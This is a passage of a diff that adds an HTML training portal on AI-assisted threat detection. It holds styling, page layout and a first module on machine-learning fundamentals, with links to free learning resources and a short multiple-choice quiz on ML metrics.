@@ -1,0 +1,1024 @@
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AI-Assisted Threat Detection Training Portal</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=JetBrains+Mono:wght@400;500&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{background:#0D1B2A;color:#E8EDF2;font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;min-height:100vh;overflow-x:hidden;}
+body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(46,117,182,0.04) 1px,transparent 1px),linear-gradient(90deg,rgba(46,117,182,0.04) 1px,transparent 1px);background-size:40px 40px;pointer-events:none;z-index:0;}
+header{position:sticky;top:0;z-index:100;border-bottom:1px solid rgba(46,117,182,0.25);background:rgba(13,27,42,0.97);backdrop-filter:blur(12px);padding:0 32px;display:flex;align-items:center;justify-content:space-between;height:60px;gap:12px;}
+.logo{display:flex;align-items:center;gap:10px;font-family:'Syne',-apple-system,sans-serif;font-weight:800;font-size:14px;letter-spacing:0.06em;text-transform:uppercase;white-space:nowrap;}
+.logo-icon{width:30px;height:30px;background:linear-gradient(135deg,#00C9E4,#9B59B6);border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0;font-weight:800;color:white;font-family:'Syne',sans-serif;}
+.nav-tabs{display:flex;gap:2px;flex-shrink:0;}
+.nav-tab{font-family:'JetBrains Mono','Consolas',monospace;font-size:11px;letter-spacing:0.08em;text-transform:uppercase;padding:6px 14px;border-radius:6px;border:none;background:transparent;color:#8FA3B8;cursor:pointer;transition:all 0.2s;white-space:nowrap;}
+.nav-tab:hover,.nav-tab.active{background:rgba(0,201,228,0.1);color:#00C9E4;}
+.hdr-right{display:flex;align-items:center;gap:10px;flex-shrink:0;}
+.name-input{font-family:'JetBrains Mono','Consolas',monospace;font-size:11px;background:rgba(255,255,255,0.05);border:1px solid rgba(46,117,182,0.25);color:#E8EDF2;padding:5px 10px;border-radius:6px;width:130px;}
+.name-input:focus{outline:none;border-color:#00C9E4;}
+.hdr-badge{font-family:'JetBrains Mono','Consolas',monospace;font-size:10px;color:#00C9E4;background:rgba(0,201,228,0.08);border:1px solid rgba(0,201,228,0.2);padding:4px 10px;border-radius:4px;letter-spacing:0.1em;white-space:nowrap;}
+.page{display:none;position:relative;z-index:1;max-width:1200px;margin:0 auto;padding:40px 32px 80px;}
+.page.active{display:block;}
+.hero-label{font-family:'JetBrains Mono','Consolas',monospace;font-size:11px;color:#00C9E4;letter-spacing:0.15em;text-transform:uppercase;margin-bottom:14px;}
+.hero-title{font-family:'Syne',-apple-system,sans-serif;font-size:clamp(28px,4.5vw,52px);font-weight:800;line-height:1.05;margin-bottom:14px;color:#E8EDF2;}
+.hero-title span{color:#00C9E4;}
+.hero-sub{color:#8FA3B8;font-size:15px;max-width:560px;line-height:1.6;margin-bottom:28px;}
+.stats-row{display:flex;gap:28px;flex-wrap:wrap;margin-bottom:32px;}
+.stat-num{font-family:'Syne',-apple-system,sans-serif;font-size:26px;font-weight:800;color:#00C9E4;line-height:1;}
+.stat-label{font-size:11px;color:#8FA3B8;text-transform:uppercase;letter-spacing:0.08em;}
+.prog-card{background:rgba(22,32,50,0.85);border:1px solid rgba(46,117,182,0.25);border-radius:12px;padding:18px 22px;display:flex;align-items:center;gap:20px;margin-bottom:28px;}
+.prog-label{font-family:'JetBrains Mono','Consolas',monospace;font-size:11px;color:#8FA3B8;white-space:nowrap;}
+.prog-track{flex:1;height:6px;background:rgba(255,255,255,0.06);border-radius:99px;overflow:hidden;}
+.prog-fill{height:100%;width:0%;background:linear-gradient(90deg,#2E75B6,#00C9E4);border-radius:99px;transition:width 0.8s ease;}
+.prog-count{font-family:'JetBrains Mono','Consolas',monospace;font-size:12px;color:#00C9E4;white-space:nowrap;}
+.filters{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:28px;}
+.filter-btn{font-family:'JetBrains Mono','Consolas',monospace;font-size:10px;letter-spacing:0.08em;text-transform:uppercase;padding:6px 13px;border-radius:6px;border:1px solid rgba(46,117,182,0.25);background:transparent;color:#8FA3B8;cursor:pointer;transition:all 0.2s;}
+.filter-btn:hover,.filter-btn.active{border-color:#00C9E4;color:#00C9E4;background:rgba(0,201,228,0.08);}
+.mod-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:18px;}
+.mod-card{background:rgba(22,32,50,0.85);border:1px solid rgba(46,117,182,0.25);border-radius:14px;overflow:hidden;transition:transform 0.2s,border-color 0.2s,box-shadow 0.2s;}
+.mod-card:hover{transform:translateY(-3px);border-color:rgba(46,117,182,0.5);box-shadow:0 12px 40px rgba(0,0,0,0.3);}
+.mod-card.completed{border-color:rgba(46,204,113,0.3);}
+.card-top{padding:18px 18px 14px;border-bottom:1px solid rgba(46,117,182,0.25);}
+.card-meta{display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;}
+.card-num{font-family:'JetBrains Mono','Consolas',monospace;font-size:10px;color:#8FA3B8;letter-spacing:0.1em;}
+.lvl-badge{font-family:'JetBrains Mono','Consolas',monospace;font-size:9px;font-weight:500;letter-spacing:0.08em;text-transform:uppercase;padding:3px 7px;border-radius:4px;}
+.lvl-Foundation{background:rgba(46,139,87,0.15);color:#5DD49A;border:1px solid rgba(46,139,87,0.3);}
+.lvl-Intermediate{background:rgba(46,117,182,0.15);color:#70B0E8;border:1px solid rgba(46,117,182,0.3);}
+.lvl-Advanced{background:rgba(192,57,43,0.15);color:#E87070;border:1px solid rgba(192,57,43,0.3);}
+.card-title{font-family:'Syne',-apple-system,sans-serif;font-size:16px;font-weight:700;line-height:1.25;margin-bottom:10px;}
+.card-info{display:flex;align-items:center;gap:10px;}
+.card-dur{font-family:'JetBrains Mono','Consolas',monospace;font-size:10px;color:#8FA3B8;}
+.card-actions{margin-left:auto;display:flex;gap:8px;align-items:center;}
+.bm-btn{background:none;border:none;cursor:pointer;color:#8FA3B8;font-size:20px;transition:color 0.2s,transform 0.15s;padding:2px 4px;line-height:1;}
+.bm-btn:hover{color:#F1C40F;transform:scale(1.2);}
+.mod-card.bookmarked .bm-btn{color:#F1C40F;}
+.chk{width:22px;height:22px;border-radius:5px;border:2px solid rgba(46,117,182,0.25);display:flex;align-items:center;justify-content:center;cursor:pointer;transition:all 0.2s;font-size:14px;font-weight:700;color:transparent;flex-shrink:0;background:transparent;}
+.chk:hover{border-color:#2ECC71;background:rgba(46,204,113,0.1);}
+.mod-card.completed .chk{background:#2ECC71;border-color:#2ECC71;color:white;}
+.sec{padding:0 18px 4px;}
+.sec-toggle{font-family:'JetBrains Mono','Consolas',monospace;font-size:9px;color:#8FA3B8;letter-spacing:0.1em;text-transform:uppercase;background:none;border:none;cursor:pointer;display:flex;align-items:center;gap:5px;padding:8px 0 6px;transition:color 0.2s;width:100%;text-align:left;}
+.sec-toggle:hover{color:#00C9E4;}
+.sec-toggle .arr{transition:transform 0.2s;display:inline-block;}
+.sec-toggle.open .arr{transform:rotate(90deg);}
+.sec-body{display:none;padding-bottom:8px;}
+.sec-body.open{display:block;}
+.topic-item{font-size:11px;color:#8FA3B8;padding:4px 8px;background:rgba(255,255,255,0.03);border-radius:4px;border-left:2px solid rgba(46,117,182,0.25);line-height:1.4;margin-bottom:3px;}
+.res-link{display:flex;align-items:flex-start;gap:9px;padding:8px 10px;border-radius:7px;text-decoration:none;transition:background 0.2s;border:1px solid transparent;margin-bottom:3px;}
+.res-link:hover{background:rgba(46,117,182,0.1);border-color:rgba(46,117,182,0.25);}
+.res-icon{width:26px;height:26px;border-radius:5px;display:flex;align-items:center;justify-content:center;font-size:11px;flex-shrink:0;margin-top:1px;font-family:'JetBrains Mono','Consolas',monospace;font-weight:700;}
+.ri-v{background:rgba(46,117,182,0.15);color:#3D8FD4;}
+.ri-r{background:rgba(232,116,26,0.15);color:#E8741A;}
+.ri-p{background:rgba(155,89,182,0.15);color:#C39BD3;}
+.res-info{flex:1;min-width:0;}
+.res-name{font-size:12px;font-weight:600;color:#E8EDF2;line-height:1.3;margin-bottom:1px;}
+.res-desc{font-size:10px;color:#8FA3B8;line-height:1.4;white-space:normal;}
+.res-meta{display:flex;align-items:center;gap:6px;margin-top:3px;flex-wrap:wrap;}
+.rl{font-family:'JetBrains Mono','Consolas',monospace;font-size:8px;padding:1px 5px;border-radius:3px;}
+.rl-b{background:rgba(46,139,87,0.12);color:#5DD49A;border:1px solid rgba(46,139,87,0.25);}
+.rl-i{background:rgba(46,117,182,0.12);color:#70B0E8;border:1px solid rgba(46,117,182,0.25);}
+.rl-a{background:rgba(192,57,43,0.12);color:#E87070;border:1px solid rgba(192,57,43,0.25);}
+.rt{font-family:'JetBrains Mono','Consolas',monospace;font-size:8px;color:#8FA3B8;}
+.act-row{display:flex;gap:8px;padding:0 18px 12px;}
+.act-btn{flex:1;display:flex;align-items:center;justify-content:center;gap:6px;padding:8px 10px;border-radius:8px;font-family:'JetBrains Mono','Consolas',monospace;font-size:9px;letter-spacing:0.08em;text-transform:uppercase;cursor:pointer;transition:all 0.2s;border:1px solid;}
+.quiz-act{background:rgba(46,117,182,0.1);border-color:rgba(46,117,182,0.3);color:#3D8FD4;}
+.quiz-act:hover{background:rgba(46,117,182,0.2);}
+.lab-act{background:rgba(155,89,182,0.1);border-color:rgba(155,89,182,0.3);color:#C39BD3;}
+.lab-act:hover{background:rgba(155,89,182,0.2);}
+.notes-sec{padding:0 18px 14px;}
+.notes-toggle{font-family:'JetBrains Mono','Consolas',monospace;font-size:9px;color:#8FA3B8;letter-spacing:0.1em;text-transform:uppercase;background:none;border:none;cursor:pointer;display:flex;align-items:center;gap:5px;padding:4px 0 8px;width:100%;text-align:left;}
+.notes-body{display:none;}
+.notes-body.open{display:block;}
+.notes-ta{width:100%;background:rgba(255,255,255,0.04);border:1px solid rgba(46,117,182,0.25);border-radius:7px;color:#E8EDF2;font-family:'Inter',-apple-system,sans-serif;font-size:12px;padding:10px;resize:vertical;min-height:80px;line-height:1.5;}
+.notes-ta:focus{outline:none;border-color:rgba(232,116,26,0.5);}
+.notes-save{margin-top:6px;font-family:'JetBrains Mono','Consolas',monospace;font-size:10px;padding:5px 12px;background:rgba(232,116,26,0.15);border:1px solid rgba(232,116,26,0.3);color:#E8741A;border-radius:5px;cursor:pointer;}
+.overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.75);z-index:999;align-items:center;justify-content:center;backdrop-filter:blur(4px);}
+.overlay.open{display:flex;}
+.modal{background:#162032;border:1px solid rgba(46,117,182,0.25);border-radius:16px;width:90%;max-width:640px;max-height:88vh;overflow-y:auto;padding:32px;position:relative;}
+.modal-x{position:absolute;top:16px;right:16px;background:none;border:none;color:#8FA3B8;font-size:20px;cursor:pointer;line-height:1;}
+.modal-x:hover{color:#E8EDF2;}
+.modal-title{font-family:'Syne',-apple-system,sans-serif;font-size:20px;font-weight:700;margin-bottom:4px;}
+.modal-sub{font-family:'JetBrains Mono','Consolas',monospace;font-size:10px;color:#8FA3B8;letter-spacing:0.1em;text-transform:uppercase;margin-bottom:22px;}
+.q-pb{height:3px;background:rgba(255,255,255,0.06);border-radius:99px;margin-bottom:20px;overflow:hidden;}
+.q-pb-fill{height:100%;background:linear-gradient(90deg,#2E75B6,#00C9E4);border-radius:99px;transition:width 0.4s;}
+.q-text{font-size:14px;font-weight:600;line-height:1.5;margin-bottom:12px;}
+.q-opts{display:flex;flex-direction:column;gap:8px;}
+.q-opt{padding:10px 14px;border-radius:8px;border:1px solid rgba(46,117,182,0.25);background:rgba(255,255,255,0.03);cursor:pointer;font-size:13px;color:#8FA3B8;transition:all 0.2s;text-align:left;}
+.q-opt:hover:not(.locked){border-color:#2E75B6;color:#E8EDF2;background:rgba(46,117,182,0.1);}
+.q-opt.correct{border-color:#2ECC71;background:rgba(46,204,113,0.1);color:#2ECC71;}
+.q-opt.wrong{border-color:#E74C3C;background:rgba(231,76,60,0.1);color:#E74C3C;}
+.q-opt.reveal{border-color:#2ECC71;background:rgba(46,204,113,0.05);color:#5DD49A;}
+.q-explain{margin-top:10px;font-size:12px;color:#8FA3B8;padding:8px 12px;background:rgba(255,255,255,0.04);border-radius:6px;border-left:3px solid #00C9E4;line-height:1.5;display:none;}
+.q-next{margin-top:14px;text-align:right;}
+.q-next-btn{font-family:'JetBrains Mono','Consolas',monospace;font-size:11px;padding:8px 20px;background:rgba(0,201,228,0.1);border:1px solid rgba(0,201,228,0.3);color:#00C9E4;border-radius:7px;cursor:pointer;display:none;}
+.q-result{text-align:center;padding:20px 0;}
+.q-score{font-family:'Syne',-apple-system,sans-serif;font-size:52px;font-weight:800;color:#00C9E4;}
+.q-score-lbl{font-size:14px;color:#8FA3B8;margin:4px 0 12px;}
+.q-msg{font-size:13px;color:#E8EDF2;margin-bottom:16px;line-height:1.5;}
+.q-retry{font-family:'JetBrains Mono','Consolas',monospace;font-size:11px;padding:8px 20px;background:rgba(0,201,228,0.1);border:1px solid rgba(0,201,228,0.3);color:#00C9E4;border-radius:7px;cursor:pointer;}
+.lab-scene{font-size:13px;color:#8FA3B8;line-height:1.6;padding:14px;background:rgba(155,89,182,0.07);border:1px solid rgba(155,89,182,0.2);border-radius:8px;margin-bottom:16px;}
+.lab-data{font-family:'JetBrains Mono','Consolas',monospace;font-size:11px;background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.08);border-radius:8px;padding:14px;margin-bottom:16px;line-height:1.7;color:#A8D8A8;overflow-x:auto;white-space:pre-wrap;}
+.lab-tl{font-family:'JetBrains Mono','Consolas',monospace;font-size:9px;color:#9B59B6;letter-spacing:0.1em;text-transform:uppercase;margin:12px 0 5px;}
+.lab-tq{font-size:13px;color:#E8EDF2;margin-bottom:7px;line-height:1.5;}
+.lab-ta{width:100%;background:rgba(255,255,255,0.04);border:1px solid rgba(46,117,182,0.25);border-radius:7px;color:#E8EDF2;font-family:'Inter',-apple-system,sans-serif;font-size:12px;padding:10px;resize:vertical;min-height:75px;line-height:1.5;}
+.lab-ta:focus{outline:none;border-color:rgba(155,89,182,0.5);}
+.lab-hint{font-size:11px;color:#8FA3B8;margin-top:12px;padding:8px 12px;background:rgba(255,255,255,0.03);border-radius:6px;border-left:3px solid #9B59B6;line-height:1.5;}
+.lab-submit{font-family:'JetBrains Mono','Consolas',monospace;font-size:11px;padding:8px 20px;background:rgba(155,89,182,0.15);border:1px solid rgba(155,89,182,0.35);color:#C39BD3;border-radius:7px;cursor:pointer;margin-top:10px;}
+.sec-title{font-family:'Syne',-apple-system,sans-serif;font-size:22px;font-weight:700;margin-bottom:6px;}
+.sec-sub{font-size:13px;color:#8FA3B8;margin-bottom:24px;}
+.gls-search{width:100%;background:rgba(255,255,255,0.05);border:1px solid rgba(46,117,182,0.25);color:#E8EDF2;padding:10px 16px;border-radius:9px;font-size:14px;margin-bottom:20px;font-family:'Inter',-apple-system,sans-serif;}
+.gls-search:focus{outline:none;border-color:#00C9E4;}
+.gls-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:12px;}
+.gls-card{background:rgba(22,32,50,0.85);border:1px solid rgba(46,117,182,0.25);border-radius:10px;padding:16px;transition:border-color 0.2s;}
+.gls-card:hover{border-color:rgba(46,117,182,0.4);}
+.gls-card.hidden{display:none;}
+.gls-term{font-family:'Syne',-apple-system,sans-serif;font-size:14px;font-weight:700;color:#00C9E4;margin-bottom:3px;}
+.gls-abbr{font-family:'JetBrains Mono','Consolas',monospace;font-size:10px;color:#8FA3B8;margin-bottom:8px;}
+.gls-def{font-size:12px;color:#8FA3B8;line-height:1.55;}
+.gls-tag{display:inline-block;margin-top:8px;font-family:'JetBrains Mono','Consolas',monospace;font-size:9px;padding:2px 7px;border-radius:4px;background:rgba(46,117,182,0.12);color:#3D8FD4;border:1px solid rgba(46,117,182,0.25);}
+.lb-note{font-family:'JetBrains Mono','Consolas',monospace;font-size:10px;color:#8FA3B8;background:rgba(241,196,15,0.06);border:1px solid rgba(241,196,15,0.15);padding:8px 14px;border-radius:7px;margin-bottom:24px;}
+.top3{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:20px;}
+.t3-card{background:rgba(22,32,50,0.85);border:1px solid rgba(46,117,182,0.25);border-radius:12px;padding:20px 16px;text-align:center;}
+.t3-card.first{border-color:rgba(255,215,0,0.3);background:rgba(255,215,0,0.03);}
+.t3-crown{font-size:22px;margin-bottom:6px;font-family:'JetBrains Mono','Consolas',monospace;font-weight:700;}
+.t3-av{width:48px;height:48px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-family:'Syne',-apple-system,sans-serif;font-weight:800;font-size:18px;margin:0 auto 8px;}
+.t3-name{font-family:'Syne',-apple-system,sans-serif;font-weight:700;font-size:14px;margin-bottom:2px;}
+.t3-mods{font-family:'JetBrains Mono','Consolas',monospace;font-size:10px;color:#8FA3B8;}
+.t3-score{font-family:'Syne',-apple-system,sans-serif;font-size:20px;font-weight:800;color:#00C9E4;margin-top:6px;}
+.lb-wrap{background:rgba(22,32,50,0.85);border:1px solid rgba(46,117,182,0.25);border-radius:14px;overflow:hidden;}
+.lb-hdr{padding:14px 20px;border-bottom:1px solid rgba(46,117,182,0.25);display:flex;justify-content:space-between;align-items:center;}
+.lb-hdr-t{font-family:'Syne',-apple-system,sans-serif;font-size:15px;font-weight:700;}
+.lb-table{width:100%;border-collapse:collapse;}
+.lb-table th{font-family:'JetBrains Mono','Consolas',monospace;font-size:10px;letter-spacing:0.1em;text-transform:uppercase;color:#8FA3B8;padding:10px 16px;text-align:left;border-bottom:1px solid rgba(46,117,182,0.25);}
+.lb-table td{padding:12px 16px;border-bottom:1px solid rgba(46,117,182,0.1);font-size:13px;}
+.lb-table tr:last-child td{border-bottom:none;}
+.lb-table tr:hover td{background:rgba(46,117,182,0.04);}
+.lb-rank{font-family:'Syne',-apple-system,sans-serif;font-size:18px;font-weight:800;}
+.r1{color:#FFD700;}.r2{color:#C0C0C0;}.r3{color:#CD7F32;}.rn{color:#8FA3B8;}
+.lb-av{width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-family:'Syne',-apple-system,sans-serif;font-weight:700;font-size:12px;flex-shrink:0;}
+.lb-nc{display:flex;align-items:center;gap:10px;}
+.lb-role{font-size:11px;color:#8FA3B8;}
+.lb-bar-w{width:80px;height:5px;background:rgba(255,255,255,0.06);border-radius:99px;overflow:hidden;}
+.lb-bar{height:100%;border-radius:99px;background:linear-gradient(90deg,#2E75B6,#00C9E4);}
+.lb-bdg{font-family:'JetBrains Mono','Consolas',monospace;font-size:9px;padding:2px 7px;border-radius:4px;border:1px solid;}
+.bdg-g{background:rgba(255,215,0,0.1);color:#FFD700;border-color:rgba(255,215,0,0.3);}
+.bdg-s{background:rgba(192,192,192,0.1);color:#C0C0C0;border-color:rgba(192,192,192,0.3);}
+.bdg-b{background:rgba(205,127,50,0.1);color:#CD7F32;border-color:rgba(205,127,50,0.3);}
+.bdg-a{background:rgba(46,117,182,0.1);color:#3D8FD4;border-color:rgba(46,117,182,0.3);}
+.bm-empty{text-align:center;padding:60px 20px;color:#8FA3B8;font-size:14px;}
+.bm-list{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:12px;}
+.bm-item{background:rgba(22,32,50,0.85);border:1px solid rgba(46,117,182,0.25);border-radius:10px;padding:16px;display:flex;align-items:center;gap:12px;cursor:pointer;transition:all 0.2s;}
+.bm-item:hover{border-color:rgba(241,196,15,0.3);}
+.bm-info{flex:1;}
+.bm-title{font-weight:600;font-size:13px;margin-bottom:2px;}
+.bm-meta{font-family:'JetBrains Mono','Consolas',monospace;font-size:10px;color:#8FA3B8;}
+.bm-rm{background:none;border:none;cursor:pointer;color:#8FA3B8;font-size:18px;transition:color 0.2s;line-height:1;}
+.bm-rm:hover{color:#E74C3C;}
+@keyframes fadeUp{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
+.mod-card{animation:fadeUp 0.35s ease both;}
+@media(max-width:1024px){.mod-grid{grid-template-columns:repeat(auto-fill,minmax(300px,1fr));}}
+@media(max-width:768px){
+  header{height:auto;min-height:52px;padding:8px 16px;flex-wrap:wrap;gap:6px;}
+  .logo{font-size:12px;flex:1;}.logo-icon{width:26px;height:26px;}
+  .nav-tabs{order:10;width:100%;overflow-x:auto;-webkit-overflow-scrolling:touch;scrollbar-width:none;padding-bottom:2px;}
+  .nav-tabs::-webkit-scrollbar{display:none;}
+  .nav-tab{font-size:10px;padding:5px 12px;white-space:nowrap;flex-shrink:0;}
+  .hdr-right{gap:8px;}.name-input{width:90px;font-size:10px;}.hdr-badge{display:none;}
+  .page{padding:20px 14px 60px;}
+  .hero-title{font-size:clamp(22px,7vw,38px);}
+  .hero-sub{font-size:14px;margin-bottom:20px;}
+  .stats-row{gap:16px;margin-bottom:24px;}.stat-num{font-size:20px;}
+  .prog-card{flex-direction:column;align-items:stretch;gap:8px;padding:14px 16px;}
+  .filters{flex-wrap:nowrap;overflow-x:auto;-webkit-overflow-scrolling:touch;scrollbar-width:none;padding-bottom:4px;margin-bottom:20px;}
+  .filters::-webkit-scrollbar{display:none;}
+  .filter-btn{font-size:9px;padding:5px 11px;white-space:nowrap;flex-shrink:0;}
+  .mod-grid{grid-template-columns:1fr;gap:12px;}
+  .card-top{padding:14px 14px 12px;}.card-title{font-size:15px;}
+  .sec,.notes-sec{padding-left:14px;padding-right:14px;}
+  .act-row{padding-left:14px;padding-right:14px;}
+  .gls-grid{grid-template-columns:1fr;}
+  .top3{gap:8px;}.t3-card{padding:14px 8px;}.t3-av{width:38px;height:38px;font-size:14px;}
+  .t3-name{font-size:12px;}.t3-score{font-size:16px;}
+  .lb-table th:nth-child(4),.lb-table td:nth-child(4),.lb-table th:nth-child(5),.lb-table td:nth-child(5){display:none;}
+  .lb-role{display:none;}.lb-table td,.lb-table th{padding:10px;font-size:12px;}
+  .bm-list{grid-template-columns:1fr;}
+  .overlay{align-items:flex-end;}
+  .modal{width:100%;max-width:100%;border-radius:16px 16px 0 0;padding:24px 18px;max-height:88vh;}
+  .q-text{font-size:13px;}.q-opt{font-size:12px;padding:9px 12px;}
+}
+@media(max-width:480px){
+  header{padding:6px 12px;}.page{padding:16px 12px 60px;}
+  .hero-title{font-size:clamp(20px,8vw,28px);}
+  .nav-tab{font-size:9px;padding:4px 10px;}
+  .act-row{flex-direction:column;}
+}
+@media(min-width:1400px){.page{max-width:1300px;}.mod-grid{grid-template-columns:repeat(3,1fr);}}
+</style>
+</head>
+<body>
+<header>
+  <div class="logo"><div class="logo-icon">AI</div>AI-Assisted Threat Detection</div>
+  <nav class="nav-tabs">
+    <button class="nav-tab active" data-page="modules">Modules</button>
+    <button class="nav-tab" data-page="glossary">Glossary</button>
+    <button class="nav-tab" data-page="leaderboard">Leaderboard</button>
+    <button class="nav-tab" data-page="bookmarks">Bookmarks</button>
+  </nav>
+  <div class="hdr-right">
+    <input class="name-input" type="text" id="analystName" placeholder="Your name..." />
+    <div class="hdr-badge">INTERNAL USE ONLY</div>
+  </div>
+</header>
+
+<div class="page active" id="page-modules">
+  <div class="hero-label">AI Security Curriculum &mdash; All Free Resources</div>
+  <h1 class="hero-title">AI-Assisted <span>Threat Detection</span></h1>
+  <p class="hero-sub">9 structured modules covering how AI and machine learning transform threat detection. From understanding ML fundamentals to deploying and tuning AI-powered security tools operationally.</p>
+  <div class="stats-row">
+    <div class="stat"><div class="stat-num">9</div><div class="stat-label">Modules</div></div>
+    <div class="stat"><div class="stat-num">~48</div><div class="stat-label">Hours</div></div>
+    <div class="stat"><div class="stat-num">100%</div><div class="stat-label">Free</div></div>
+    <div class="stat"><div class="stat-num">60+</div><div class="stat-label">Resources</div></div>
+  </div>
+  <div class="prog-card">
+    <span class="prog-label">YOUR PROGRESS</span>
+    <div class="prog-track"><div class="prog-fill" id="progFill"></div></div>
+    <span class="prog-count" id="progCount">0 / 9 complete</span>
+  </div>
+  <div class="filters">
+    <button class="filter-btn active" data-filter="all">All</button>
+    <button class="filter-btn" data-filter="Foundation">Foundation</button>
+    <button class="filter-btn" data-filter="Intermediate">Intermediate</button>
+    <button class="filter-btn" data-filter="Advanced">Advanced</button>
+    <button class="filter-btn" data-filter="bookmarked">Bookmarked</button>
+    <button class="filter-btn" data-filter="completed">Completed</button>
+  </div>
+  <div class="mod-grid" id="modGrid"></div>
+</div>
+
+<div class="page" id="page-glossary">
+  <div class="sec-title">Glossary</div>
+  <div class="sec-sub">Core terms for AI-assisted threat detection practitioners.</div>
+  <input class="gls-search" id="glsSearch" type="text" placeholder="Search terms..." />
+  <div class="gls-grid" id="glsGrid"></div>
+</div>
+
+<div class="page" id="page-leaderboard">
+  <div class="sec-title">Team Leaderboard</div>
+  <div class="sec-sub">Track your team's progress through the curriculum.</div>
+  <div class="lb-note">MOCK DATA &mdash; Connect a backend to enable live tracking.</div>
+  <div class="top3" id="top3"></div>
+  <div class="lb-wrap">
+    <div class="lb-hdr"><div class="lb-hdr-t">Full Rankings</div><div style="font-family:'JetBrains Mono',monospace;font-size:10px;color:#8FA3B8;">MOCK DATA</div></div>
+    <table class="lb-table"><thead><tr><th>Rank</th><th>Analyst</th><th>Modules</th><th>Progress</th><th>Quiz Avg</th><th>Badge</th></tr></thead><tbody id="lbBody"></tbody></table>
+  </div>
+</div>
+
+<div class="page" id="page-bookmarks">
+  <div class="sec-title">Bookmarked Modules</div>
+  <div class="sec-sub">Modules you have saved for quick access.</div>
+  <div id="bmContent"></div>
+</div>
+
+<div class="overlay" id="quizOverlay">
+  <div class="modal">
+    <button class="modal-x" id="quizClose">x</button>
+    <div class="modal-title" id="quizTitle"></div>
+    <div class="modal-sub" id="quizSub"></div>
+    <div class="q-pb"><div class="q-pb-fill" id="qPBFill"></div></div>
+    <div id="quizBody"></div>
+  </div>
+</div>
+
+<div class="overlay" id="labOverlay">
+  <div class="modal">
+    <button class="modal-x" id="labClose">x</button>
+    <div class="modal-title" id="labTitle"></div>
+    <div class="modal-sub">Hands-On Lab Exercise</div>
+    <div id="labBody"></div>
+  </div>
+</div>
+
+<script>
+var MODS = [
+{num:1,title:"ML Fundamentals for Security Analysts",dur:"5 hours",level:"Foundation",
+topics:["What is machine learning and why it matters for security","Supervised vs unsupervised vs reinforcement learning","Classification, regression, clustering, anomaly detection","How models are trained, validated, and deployed","Bias, variance, overfitting, and underfitting","Key ML metrics: precision, recall, F1, AUC-ROC"],
+videos:[
+{n:"Google: Machine Learning Crash Course",d:"Free comprehensive ML fundamentals course from Google - covers key concepts with exercises",u:"https://developers.google.com/machine-learning/crash-course",l:"b",t:"~15 hrs"},
+{n:"3Blue1Brown: Neural Networks Series",d:"Visual intuitive explanations of how neural networks learn - essential foundation",u:"https://www.youtube.com/playlist?list=PLZHQObOWTQDNU6R1_67000Dx_ZCJB-3pi",l:"b",t:"~3 hrs"},
+{n:"StatQuest: Machine Learning Fundamentals",d:"Clear visual explanations of ML concepts including ROC curves and confusion matrices",u:"https://www.youtube.com/c/joshstarmer",l:"b",t:"Various"}
+],
+reading:[
+{n:"NIST AI Risk Management Framework",d:"Official NIST framework for managing AI risk - foundational reading for security teams",u:"https://airc.nist.gov/Home",l:"b",t:"Reference"},
+{n:"Google: Rules of Machine Learning",d:"Practical engineering rules for ML in production - free best practices guide",u:"https://developers.google.com/machine-learning/guides/rules-of-ml",l:"b",t:"Guide"},
+{n:"Interpretable Machine Learning Book (Free)",d:"Free online book covering ML models, interpretability, and evaluation",u:"https://christophm.github.io/interpretable-ml-book/",l:"b",t:"Book"},
+{n:"MITRE ATLAS: Adversarial Threat Landscape for AI Systems",d:"MITRE knowledge base mapping adversary tactics against ML systems",u:"https://atlas.mitre.org/",l:"b",t:"Reference"}
+],
+practice:[
+{n:"Kaggle: Intro to Machine Learning (Free)",d:"Hands-on free course with Jupyter notebooks and real datasets",u:"https://www.kaggle.com/learn/intro-to-machine-learning",l:"b",t:"~3 hrs"},
+{n:"Google Colab: Free ML Notebooks",d:"Free cloud Jupyter environment to run ML experiments without local setup",u:"https://colab.research.google.com/",l:"b",t:"Tool"}
+],
+quiz:[
+{q:"What type of ML learns from labeled training data to predict outcomes on new data?",o:["Unsupervised learning","Reinforcement learning","Supervised learning","Transfer learning"],a:2,e:"Supervised learning uses labeled examples (input-output pairs) to train a model. Most security classifiers (malware/benign) are supervised."},
+{q:"In a threat detection model, a false negative means:",o:["A benign event flagged as malicious","A malicious event correctly detected","A malicious event missed by the model","A benign event correctly ignored"],a:2,e:"False negatives are missed threats - the most dangerous outcome for a security model. High recall minimizes false negatives."},
+{q:"What does AUC-ROC measure?",o:["Model training speed","The model's ability to distinguish between classes across all thresholds","Memory usage during inference","Number of features used"],a:1,e:"AUC-ROC (Area Under the ROC Curve) measures overall classification performance across all decision thresholds. AUC of 1.0 is perfect; 0.5 is random."},
+{q:"Your intrusion detection model has 99% accuracy on training data but performs poorly on new traffic. This is called:",o:["Underfitting","Transfer learning","Overfitting","Regularization"],a:2,e:"Overfitting means the model memorized training data patterns but fails to generalize to new data - a critical problem for production security tools."},
+{q:"Which metric is most important when the cost of missing an attack is very high?",o:["Precision","Accuracy","Recall","Specificity"],a:2,e:"Recall (true positive rate) measures what fraction of actual threats were detected. When missing threats is costly, maximize recall even at the expense of more false positives."}
+],
